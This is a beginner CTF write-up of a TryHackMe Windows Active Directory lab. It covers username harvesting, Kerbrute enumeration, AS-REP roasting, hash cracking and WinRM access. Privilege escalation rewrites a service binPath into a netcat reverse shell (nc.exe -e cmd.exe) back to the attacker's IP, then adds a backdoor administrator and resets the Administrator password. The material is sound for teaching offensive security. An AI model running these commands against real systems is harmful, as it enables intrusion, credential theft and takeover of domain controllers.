# TryHackMe: Services – Walkthrough & Writeup

Welcome to my writeup for the **Services** room on TryHackMe. This is a beginner-friendly machine designed to test your enumeration skills and exploitation of common network services in AD environment on a Windows Server. I have tried to keep the it as short and simple as possible with explanations on everything assuming that you are a total beginner. 

## 🎯 Objective
* Find the **User** flag.
* Escalate privileges and find the **Root** flag.

Start up the lab and connect using Open VPN to your own Kali Lab (highly recommended)

## 🔍 Phase 1: Reconnaissance & Port Scanning

Every successful penetration test or CTF challenge starts with information gathering. We need to find out what doors (ports) are open on the target machine and what services are running behind them. To do this, we will use my favourite network scanning tool called **Nmap**.

### The Nmap Command
Here is the exact command used to scan the target IP (`10.114.181.105`):

```nmap -p- -Pn -A --min-rate 2000 --initial-rtt-timeout 50ms --max-rtt-timeout 150ms --max-retries 1 --stats-every 1m 10.114.181.105```

Standard Nmap scans can be slow. This specific command is tuned for speed and efficiency in a CTF environment so we don't waste time waiting for results:

- `-p-` (Scan all ports): By default, Nmap only checks the top 1,000 most common ports. This forces it to scan all 65,535 possible ports so we don't miss any hidden services.
- `-Pn` (Skip host discovery): Treats the target as online. Many machines block standard "ping" requests; this bypasses that check so the scan actually runs.
- `-A` (Aggressive mode): A 3-in-1 flag that enables OS detection, version scanning, and runs default scripts for vulnerability detection.
- `--min-rate 2000` (Minimum packet rate): Forces Nmap to send at least 2,000 packets per second, dramatically speeding up the scan.
- `--initial-rtt-timeout 50ms / --max-rtt-timeout 150ms`: Caps the waiting time for a response between 50ms and 150ms. If a port doesn't answer quickly, Nmap moves on instead of hanging.
- `--max-retries 1` (Limit probe retries): If a port doesn't respond, Nmap will only retry once instead of the default 10 times, saving massive amounts of time.
- `--stats-every 1m` (Status updates): Prints a progress report in your terminal every 1 minute so you know the scan is still running smoothly.

⚠️ Beginner Tip: While these speed-optimization flags are perfect for CTFs, they are incredibly loud and noisy. In a real-world penetration test, this traffic would immediately alert the target's security team!

Figure 1: Nmap Scan Result

<img width="632" height="689" alt="image-157" src="https://github.com/user-attachments/assets/77cde6d8-079d-4591-82e0-b686ce46b18b" />

<img width="627" height="597" alt="image-156" src="https://github.com/user-attachments/assets/91889e97-edcd-4142-8705-7c6b86e63816" />


## 🧩 Analyzing the Nmap Results: Connecting the Dots

When you run an Nmap scan and a massive wall of text pops up, your job isn't to memorize every single line. Your job is to look at the patterns and ask: 

> *"What is this server's primary job, and how can I use this information?"*

Before diving into individual ports, let's look at the overall ecosystem of what we found.

### The Big Picture: What is this machine?
We see **Kerberos (Port 88)**, **LDAP (Port 3268)**, and **SMB (Port 445)** all open together on the same target. 

* **The Conclusion:** This is a **Windows Domain Controller** managing an **Active Directory (AD)** environment. 
* **The Domain Name:** Looking closely at the SSL certificate and RDP information inside the scan results, we can extract the internal domain name: `services.local`
* **The Hostname:** `WIN-SERVICES`
* **The OS:** Windows Server (Specifically, the Nmap output shows product version `10.0.17763`, which a quick Google search reveals is **Windows Server 2019**).

Open Ports -
```
53/tcp    open  domain                 # Simple DNS Plus - Active Directory requires DNS to function         # can try DNS zone transfer
80/tcp    open  http                   # web server Microsoft IIS 10.0         # can try directory enumeration, and other web attacks   
88/tcp    open  kerberos-sec           # kerberos (handles authentication tickets)     # Username Enumeration for kerbrute > kerberoasting/asreproasting > cracking hash 
135/tcp   open  msrpc
139/tcp   open  netbios-ssn            # smb                                         # check for null session, anonymous access, shares enumeration
389/tcp   open  ldap
445/tcp   open  microsoft-ds           # microsoft-ds                                         # check for null session, anonymous access, shares enumeration
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl       # LDAP (handles directory lookups)
3389/tcp  open  ms-wbt-server          # Remote Desktop Protocol, which allows administrators to log in with a GUI.     # only login with valid credentials, do not brute force
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm                  # Windows Remote Management, Windows version of SSH    # if you can't login to rdp, try this
```

## 🎯 Phase 2: Finding Our Way In
While you can—and absolutely should—explore the other open ports for practice, I'm am going to focus on the most direct path into this machine. 

Since we know this is an Active Directory environment named `services.local`, our immediate goal is to find valid domain usernames. If we can get a list of real users, we can attempt an attack called **AS-REP Roasting** (a technique where we look for users that don't require pre-authentication so we can try to crack their password hashes offline).

But first, we need names. Let's start with the low-hanging fruit: **the web server**.

### Step 1: Scouring the Web Page
Whenever port 80 or 443 is open, always open your browser and look around. Companies often leave clues right on their public-facing sites. 

We are specifically hunting for:
* **Employee directories** or "About Us" pages.
* **Contact emails** (e.g., `j.smith@services.local` tells us the username format).
* **Blog post authors** or news updates.

You can try all other above mentioned possibilities for practice or to find another way in the machine, i i did it too, but i'll continue with the easiest way into this machine. As we know its an Ad enviornment and through nmap scan we got the domain name as services.local, lets first try the path this labs wants us to take, ie; asreproasting. for that first find usernames -
open the webpage and look for usernames

Look closely at the team section and the contact page. By scraping the names listed on the site, we can build our initial list of potential target usernames.

Figure: 2 Website Homepage Footer

<img width="1276" height="708" alt="image-158" src="https://github.com/user-attachments/assets/a1fcf713-b93a-44d6-a485-83870fbc56e6" />

`j.smith@services.local` tells us the format a company uses plus a probable username.

Figure 3: Website's About Page

<img width="1273" height="601" alt="image-159" src="https://github.com/user-attachments/assets/fedc17ad-7bae-4050-ade2-24b99e059382" />

### Step 2: Harvesting Names and Generating Usernames
Navigating to the "About" page of the website pays off. We successfully uncover four names listed under the team section:
* Joanne Doe
* Jack Rock
* Will Masters
* Johnny LaRusso

Active Directory environments usually follow a strict naming convention for employee logins, and by that email address we can easily guess but I'll introduce you to a great tool called **AD-Username-Generator** for future which will generate a list of all possible combinations.

First, clone the repository and navigate into the directory:
```
git clone [https://github.com/mohinparamasivam/AD-Username-Generator](https://github.com/mohinparamasivam/AD-Username-Generator)
cd AD-Username-Generator
```

Figure 4: git clone AD-Username-Generator

<img width="551" height="130" alt="image-160" src="https://github.com/user-attachments/assets/72151dd1-1930-48c9-86ad-c787fcbe2431" />

Next, create a raw text file named unameservices.txt and paste the harvested names exactly as they appeared, using a Firstname Lastname format:
Joanne Doe
Jack Rock
Will Masters
Johnny LaRusso

Now, run the Python script. We pass our raw names file as the input (-u) and specify an output file (-o) where our generated combinations will be saved: 
```
python3 username-generate.py -u unameservices.txt -o servicesadnames.txt
```

Figure 5: Results of AD-Username-Generator

<img width="592" height="681" alt="image-161" src="https://github.com/user-attachments/assets/70a7dba2-a121-4684-861a-7b9397afab13" />

### Step 3: Validating Users with Kerbrute
Now that we have a solid list of potential username combinations, we need a way to test them against the Active Directory Domain Controller to see which ones are actually valid. 
To do this without locking out accounts or making too much noise, we use a tool called **Kerbrute**. Kerbrute takes advantage of the Kerberos pre-authentication process, which allows us to rapidly validate usernames without generating Windows logon failure events (Event ID 4625).

First, let's download the compiled Linux binary directly from GitHub using `wget`:
```
wget [https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64)
```
 Before we can run the tool, we need to give it execution permissions using chmod:
```
`chmod +x kerbrute_linux_amd64`
```

Figure 6: Downloading Kerbrute

<img width="626" height="605" alt="image-162" src="https://github.com/user-attachments/assets/488b9561-d964-4686-8d21-dd7272bac624" />

Try to run it using - `./kerbrute_linux_amd64`

Figure 7: Run Kerbrute

<img width="625" height="565" alt="image-163" src="https://github.com/user-attachments/assets/236397c0-556e-4444-9890-92f69188b330" />

### Step 4: Setting Up Global Commands & Enumerating
Instead of always typing `./kerbrute_linux_amd64` from this specific folder, we can move the file into our system's binary directory (`/usr/bin`). This allows us to call it from any folder on our attack machine.
Copy the binary to `/usr/bin/` and test that it works globally:
```
cp kerbrute_linux_amd64 /usr/bin/kerbrute
kerbrute -h
```

Figure 8: Run Kerbrute from /bin

<img width="628" height="300" alt="image-164" src="https://github.com/user-attachments/assets/f05aa90b-4d35-463c-a607-ae4c75264064" />

Now we will feed the tool our generated username list (servicesadnames.txt), point it at the target Domain Controller IP (--dc 10.114.181.105), specify our active domain (-d services.local), and save the valid outputs directly into a file called generated.txt using the > operator:
```
kerbrute userenum servicesadnames.txt  --dc 10.114.181.105 -d services.local > generated.txt 
```

Figure 9: Run Kerbrute against usernames

<img width="600" height="266" alt="image-165" src="https://github.com/user-attachments/assets/8b24c51c-b47c-4bb0-a2c7-b30547558a5f" />

### Step 5: Extracting and Cleaning Valid Users
After running Kerbrute, our `generated.txt` file reveals four valid Active Directory accounts:
```
2026/06/04 06:06:32 >  [+] VALID USERNAME:       j.doe@services.local
2026/06/04 06:06:33 >  [+] VALID USERNAME:       w.masters@services.local
2026/06/04 06:06:33 >  [+] VALID USERNAME:       j.rock@services.local
2026/06/04 06:06:33 >  [+] VALID USERNAME:       j.larusso@services.local
```
Now we have a clean picture of the target format: firstinitial.lastname.

Before we move to the attack phase, we need a list containing only the raw usernames (without the timestamps or the @services.local domain attachment). You can copy-paste these into a new file manually, or use this sleek Linux pipeline to strip everything away instantly:
```
grep "VALID USERNAME:" generated.txt | awk -F' ' '{print $NF}' | cut -d'@' -f1 > clean_users.txt
```

Figure 10: clean formatting of usernames found

<img width="628" height="146" alt="image-166" src="https://github.com/user-attachments/assets/9b446b3c-d40e-4e6e-8ab7-1baf4133b416" />

### Step 6: Weaponization (AS-REP Roasting)
With a clean target list of active users, we can execute: AS-REP Roasting.

What is AS-REP Roasting?

When a user requests a login ticket from Active Directory (a Kerberos AS-REQ), the server normally expects some encrypted data proving the user knows their password. However, if an account has an explicit setting turned on called "Do not require Kerberos preauthentication", any attacker can request a login ticket for that user. The server will hand back an encrypted reply (AS-REP) containing a password hash that we can download and attempt to crack offline.

We will use Impacket's GetNPUsers tool to check our users and pull down any available hashes:
```
impacket-GetNPUsers services.local/ -dc-ip 10.114.181.105 -usersfile clean_users.txt -outputfile hashes.txt
```

Figure 11: Asreproasting

<img width="625" height="209" alt="image-167" src="https://github.com/user-attachments/assets/7cf1ef4e-9b29-4a8b-936d-c69248ea3fa8" />

While some accounts come back with errors like User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set, the tool successfully hits gold on another account:
$krb5asrep$23$j.rock@SERVICES.LOCAL:78ab290e76cfd82bf9d313f34ec8e525$18240d0903460288...

We successfully intercepted a valid Kerberos hash for the user j.rock and saved it straight to hashes.txt

## 🔨 Phase 3: Cracking and Gaining Shell
Now that we have captured an AS-REP hash for `j.rock`, it's time to extract the plaintext password using **John the Ripper**. 
We will feed the hash file to John and use the `rockyou.txt` wordlist to brute-force it:
```
john --wordlist=/home/kali/rockyou.txt hashes.txt
```

Figure 12: Hash Cracking using John The Ripper

<img width="622" height="171" alt="image-168" src="https://github.com/user-attachments/assets/b00e6045-a197-4b60-a5c3-451af73b6c3b" />

Within moments, John cracks the hash and reveals the valid domain credentials:
`j.rock:Serviceworks1` 

Whenever you gain your first set of valid domain credentials in an Active Directory environment, your immediate next step should always be to check for Kerberoasting.

What is Kerberoasting?

While AS-REP Roasting targets accounts that don't require pre-authentication, Kerberoasting targets Service Accounts (accounts mapped to a Service Principal Name, or SPN, like web servers or databases). Since any regular domain user can request a Kerberos ticket for any service account in the domain, we can use our new credentials for j.rock to ask the domain controller for these tickets and attempt to crack them offline.

We use Impacket's GetUserSPNs tool to request tickets for all available SPNs:
```
impacket-GetUserSPNs -dc-ip 10.114.181.105 'services.local/j.rock:Serviceworks1' -request
```
Unfortunately, this avenue came up dry—there are no Kerberoasting-susceptible service accounts configured for our current user privilege levels.

Figure 13: Kerberoasting

<img width="626" height="98" alt="image-169" src="https://github.com/user-attachments/assets/3532cf09-e3a9-4a3e-a24b-1c748963f79b" />

Okay so first let's check if our credentials give us access to SMB (Port 445), and ask NetExec to list the domain users while it's at it by appending the `--users` flag:
```
netexec smb 10.114.181.105 -u 'j.rock' -p 'Serviceworks1' --users
```

Figure 14: SMB enumerate Users

<img width="625" height="342" alt="image-170" src="https://github.com/user-attachments/assets/c684f5fc-0a85-4597-a2df-739b3f7f553d" />

As you can see in the terminal capture below, the green [+] indicates the credentials are valid for the domain. NetExec then successfully extracts a list of accounts directly from the Domain Controller.

While SMB access is great for looking around file shares, what we really want is an interactive command-line shell on the target system. Let's see if j.rock is allowed to log in remotely via WinRM (Windows Remote Management, Port 5985).
```
netexec winrm 10.114.181.105 -u 'j.rock' -p 'Serviceworks1'
```

Figure 15: WinRM Logon Check

<img width="626" height="148" alt="image-171" src="https://github.com/user-attachments/assets/f2249c1c-d665-431d-b3cb-8925b3bac53e" />

Look closely at the resulting output in the image below. NetExec doesn't just give us a standard green [+]; it prints a bright (Pwn3d!) tag! This means our user belongs to a group (like Remote Management Users or Administrators) that has full remote login privileges on this server.

With confirmation that we can execute remote commands, we use Evil-WinRM to drop into an interactive PowerShell session on the target box:
```
evil-winrm -u j.rock -p Serviceworks1 -i 10.114.181.105
```

Figure 16: Login using Evil-Winrm

<img width="627" height="196" alt="image-172" src="https://github.com/user-attachments/assets/49686a68-a6e4-4a9c-b35f-fb740c118c24" />

The tool establishes a connection and drops us directly into a PowerShell prompt at C:\Users\j.rock\Documents>
We are officially inside the network!

With our interactive PowerShell session active, our immediate next step is to grab the user flag. The user flag is typically tucked away on the active user's Desktop directory.
Navigate over to `j.rock`'s Desktop and inside, you will spot a file named user.txt. Read its contents using the type command to capture the first flag!

Figure 17: Capture User Flag

<img width="616" height="492" alt="image-173" src="https://github.com/user-attachments/assets/f4f5bcd8-9824-4b59-9d78-f7222f56ddb3" />

## 👑 Phase 4: Privilege Escalation 
Gaining a user shell is only half the battle. Now, we need to escalate our privileges to administrative or `NT AUTHORITY\SYSTEM` level to find the root flag. 

### Step 1: Enumerating User Tokens & Groups
The very first command you should run on any new Windows shell is `whoami /all`. This command reveals your user details, security identifiers (SIDs), the groups you belong to, and your active privileges.

Figure 18: whoami /all

<img width="626" height="632" alt="image-177" src="https://github.com/user-attachments/assets/0ce391c9-048d-4627-8069-7af2a3c4e868" />

Looking closely at our group membership in the image above, we hit an absolute goldmine: we belong to BUILTIN\Server Operators.

Members of the Server Operators group are natively allowed to administer Windows Domain Controllers. Crucially, this gives us the right to start, stop, and modify system services. If we can find a background service running with high privileges (SYSTEM), we can reconfigure it to run malicious payloads instead of its original program, then restart it to execute our code as the administrator.

Let's see which services are running on this machine and check if our current configuration gives us the access permissions needed to manipulate them. We run the `services` command to check our rights.

Figure 19: services

<img width="713" height="372" alt="image-178" src="https://github.com/user-attachments/assets/cd193769-a6e0-47a3-98d2-40596bf4b47f" />

The output gives us a list of background programs and tells us explicitly where we have configuration rights (Privileges: True)

We see several critical services running natively with edit privileges enabled for us, such as ADWS (Active Directory Web Services), AmazonSSMAgent, and AWSLiteAgent. Since these services run with deep system permissions, modifying any of them will give us our direct ticket to total machine takeover. We will modify AWSLiteAgent.

Now that we have chosen our target service **AWSLiteAgent** we need a way to hijack it. The plan is simple: upload a Windows version of **Netcat (`nc.exe`)** to the target box, and reconfigure the service to run our Netcat command. When the service starts, it will send an administrative reverse shell back to our attack machine.

First, let's locate `nc.exe` inside Kali Linux's native binaries directory, and spin up a quick Python HTTP server to host the file:
```
cd /usr/share/windows-resources/binaries/
python3 -m http.server 8000 (run inside the nc.exe containing folder)
```

Figure 20: locate and host nc.exe

<img width="520" height="239" alt="image-179" src="https://github.com/user-attachments/assets/399e71e2-1b13-4e88-a744-6c6b27ea21c9" />

Switching back over to our Evil-WinRM shell on the target machine, we pull down the executable from our Kali IP) and run `dir` right after to verify the transfer succeeded.

Figure 21: Transfer nc.exe

<img width="685" height="199" alt="image-180" src="https://github.com/user-attachments/assets/cac7fc96-32c4-43e0-817d-6c962c6919c3" />

With our payload sitting on the target, it’s time to weaponize the AWSLiteAgent service using the Windows Service Control tool (sc.exe).

First, open a brand new terminal tab on your Kali host and set up a Netcat listener to catch the incoming connection. We will use port 443 (standard HTTPS traffic) because firewalls often allow outbound traffic on this port without a second thought:
```
nc -nvlp 443
```

Now, go back to your Evil-WinRM session and use sc.exe config to modify the service's binary path (binPath). We change it from its original executable path to point directly to our newly uploaded nc.exe, complete with the arguments needed to force-feed a Windows Command Prompt (cmd.exe) back to our listener:
```
sc.exe config AWSLiteAgent binPath="C:\Users\j.rock\Desktop\nc.exe -e cmd.exe 192.168.250.181 443"
```

Figure 22: Modifying Service with sc.exe

<img width="715" height="52" alt="image-183" src="https://github.com/user-attachments/assets/68e7ec3e-b783-45d1-ba8e-f4836c9f6af3" />

Figure 23: Verify the change by typing 'services'

<img width="751" height="34" alt="image-186" src="https://github.com/user-attachments/assets/9e03d104-e8fa-468b-9fc5-8562e19ca0a1" />

With our service configuration altered, we restart the service to execute our netcat command:
```
sc.exe stop AWSLiteAgent
sc.exe start AWSLiteAgent
```

Figure 24: Service Restart

<img width="643" height="89" alt="image-184" src="https://github.com/user-attachments/assets/f96fa159-55ce-49a0-b518-519274b5d4a0" />

Figure 25: Got the admin shell

<img width="508" height="123" alt="image-181" src="https://github.com/user-attachments/assets/d96a61fc-7c28-42ee-8cea-d82fbf9257a2" />

Looking at our listener, we instantly catch an administrative reverse shell! However, Windows services expect a specific "handshake" reply from the application they launch. Because nc.exe doesn't send this service-favorable code, Windows thinks the service crashed and force-kills it after exactly 30 seconds (FAILED 1053).
We are only getting administrative shell for 30 seconds, which is bad actually so we'll try to rectify this.

We will trigger the shell again and immediately attempt to create a persistent backdoor user named hacker and add them to the local Administrators group:
```
net user hacker Password123 /add
net localgroup administrators hacker /add
```

Figure 26: Adding new admin user

<img width="537" height="208" alt="image-185" src="https://github.com/user-attachments/assets/d022c716-b44b-455b-993d-6c09dcfd77cb" />

With our custom hacker account successfully added to the local Administrators group, we exit netcat and try to log in via Evil-WinRM for a stable session:
```
evil-winrm -i 10.114.181.105 -u 'hacker' -p 'Password123!'
```

Figure 27: Shell with new admin user

<img width="853" height="229" alt="image-182" src="https://github.com/user-attachments/assets/7b217e68-189b-428d-a5e3-38bf4e5c6563" />

But we hit a wall: WinRM::WinRMAuthorizationError.
Evil-WinRM connection failing due to strict remote administration policies.
Windows features a built-in security policy for remote logins. Even if a newly created user is an Administrator, they cannot execute administrative commands over a remote network connection unless they are explicitly members of the Remote Management Users group.

To bypass this, we trigger our temporary 30-second netcat shell one more time to add our hacker account to that specific group:
```
net localgroup "Remote Management Users" hacker /add
```

Figure 28: add new user to Remote Management Users group

<img width="552" height="167" alt="image-187" src="https://github.com/user-attachments/assets/d6c57552-a38e-4116-8eba-079c872d0b8f" />

We log back in via Evil-WinRM, and it connects! But we face another quirk: as soon as we type any command, the UAC remote restrictions kick in and immediately terminate our connection with an error.

Instead of playing cat-and-mouse with custom user permissions inside a restricted environment, we pivot to the highest authority on the box. We trigger our 30-second netcat shell one final time and use our SYSTEM authority to directly overwrite the built-in Administrator's password:
```
net user Administrator NewAdminPassword123!
```

 Figure 29: reset main administrator password

<img width="546" height="173" alt="image-188" src="https://github.com/user-attachments/assets/86ce3c47-1001-4f65-832d-1ef932c284c6" />

Because the built-in Administrator account is immune to standard remote UAC token stripping, we can now use Evil-WinRM to log in seamlessly:
Bash
```
evil-winrm -i 10.114.181.105 -u 'Administrator' -p 'NewAdminPassword123!'
```

Figure 30: Login as Administrator

<img width="842" height="165" alt="image-189" src="https://github.com/user-attachments/assets/36ec6590-78e5-4e9c-a006-061cdb51b3cd" />

It works perfectly! A stable, permanent shell as services\administrator.

All that's left is to navigate to the Administrator's Desktop directory to collect our final prize:
```
cd C:\Users\Administrator\Desktop
dir
type root.txt
```

Figure 31: Capture the root flag

<img width="638" height="237" alt="image-190" src="https://github.com/user-attachments/assets/0b2cb6a6-f76e-4792-93f4-616fbef0acdc" />

Thanks for reading my first CTF writeup! Happy hacking!


## 📋 Quick Reference: Methodology Summary

> 1. **Reconnaissance & Identification**
>    * We initiated the attack surface analysis by conducting a high-speed port scan to identify active services. By evaluating the overall port ecosystem (discovering Kerberos, LDAP, and SMB running concurrently), we determined that the target machine functions as a Windows Domain Controller for an Active Directory environment.

> 2. **OSINT & Username Combination Generation**
>    * We conducted Open Source Intelligence (OSINT) gathering by analyzing the target web server's public "About Us" page. After extracting the full names of the internal team members, we utilized an automated generation utility to compile a comprehensive list of potential Active Directory login permutations.

> 3. **User Enumeration & Filtering**
>    * We validated our list of potential usernames against the live Active Directory Domain Controller by interacting with the Kerberos pre-authentication endpoint. Valid accounts were logged, and the raw outputs were filtered through a string-manipulation pipeline to isolate the verified usernames.

> 4. **Weaponization & Hash Cracking (Initial Access)**
>    * We performed an AS-REP Roasting attack against the verified user accounts to check for explicit configurations that bypass Kerberos pre-authentication. After successfully retrieving an encrypted ticket response for a target account, we cracked the hash offline via brute-force against a standard wordlist to recover the plaintext password.

> 5. **Credential Validation & Shell Capture**
>    * We verified the network utility of our newly acquired credentials across both SMB and WinRM protocols. Upon receiving confirmation that the user account possessed remote management privileges, we initialized a remote PowerShell session to gain our initial foothold and capture the user flag.

> 6. **Privilege Enumeration & Payload Transfer**
>    * We conducted internal system enumeration to inspect our active group tokens, discovering that our user belonged to the highly privileged `Server Operators` group. Recognizing that this group grants native permissions to modify system services, we set up a local deployment server and transferred a standalone terminal agent to the target's writable workspace.

> 7. **Service Hijacking & Troubleshooting Restrictions**
>    * We reconfigured the execution path of a high-privilege system service to launch our terminal agent and point back to our local listener. To overcome a strict 30-second service runtime timeout and circumvent Windows remote User Account Control (UAC) authorization limits for custom administrative users, we utilized our temporary high-privilege windows to reset the password of the built-in Domain Administrator account.

> 8. **Root Takeover**
>    * We leveraged our updated credentials to establish a stable, unrestricted remote management session under the context of the native Domain Administrator account, granting us complete machine control to extract the final root flag.
